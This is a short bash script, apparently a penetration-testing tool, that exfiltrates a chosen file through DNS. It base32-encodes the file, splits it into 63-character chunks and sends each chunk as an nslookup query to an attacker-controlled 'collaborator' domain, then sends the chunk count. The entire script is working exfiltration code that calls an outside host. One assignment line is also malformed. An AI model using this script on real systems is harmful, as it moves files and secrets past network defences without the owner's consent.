#!/bin/bash
dnsFlag="nspi"
amountFlag="amount"

echo -n "Collaborator domain: "
read collabDomain

#Read in data to exfiltrate
echo -n "File to exfiltrate: "
read data
data = `cat $data`
#Convert data to base32, space into 63-character chunks, delimit on spaces
data="$(echo $data | base32)"
data="$(echo $data | sed -r 's/(.{63})/\1 /g')"
data="$(echo $data| tr = ' ')"

#Set a counter to keep track of size
counter=0
for word in $data
do
    nslookup "$dnsFlag.$word.$counter.$collabDomain" > /dev/null
    ((counter+=1))
done
echo "Counter is $counter"

#Let the server know how many requests we sent
nslookup "$dnsFlag.$amountFlag.$counter.$collabDomain" > /dev/null
